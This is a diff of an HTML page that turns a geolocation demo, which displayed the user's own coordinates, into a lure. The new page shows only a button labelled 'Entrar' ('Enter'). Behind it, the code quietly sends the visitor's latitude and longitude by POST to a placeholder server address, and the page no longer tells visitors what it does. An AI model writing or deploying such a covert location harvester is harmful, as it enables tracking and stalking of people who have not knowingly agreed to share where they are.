@@ -2,39 +2,68 @@
 <html>
 <head>
     <title>Location Tracker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 20px;
+            cursor: pointer;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <p>Click the button to get your coordinates:</p>
-    <button onclick="getLocation()">Get Location</button>
-    <p id="demo"></p>
+    <div>
+        <button onclick="getLocation()">Entrar</button>
+    </div>
 
     <script>
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
             } else {
-                document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
+                alert("Geolocation is not supported by this browser.");
             }
         }
 
-        function showPosition(position) {
-            document.getElementById("demo").innerHTML = "Latitude: " + position.coords.latitude + 
-            "<br>Longitude: " + position.coords.longitude;
+        function sendPosition(position) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "URL_DEL_SERVIDOR_AQUI", true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            }));
         }
 
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    document.getElementById("demo").innerHTML = "User denied the request for Geolocation.";
+                    alert("User denied the request for Geolocation.");
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    document.getElementById("demo").innerHTML = "Location information is unavailable.";
+                    alert("Location information is unavailable.");
                     break;
                 case error.TIMEOUT:
-                    document.getElementById("demo").innerHTML = "The request to get user location timed out.";
+                    alert("The request to get user location timed out.");
                     break;
                 case error.UNKNOWN_ERROR:
-                    document.getElementById("demo").innerHTML = "An unknown error occurred.";
+                    alert("An unknown error occurred.");
                     break;
             }
         }
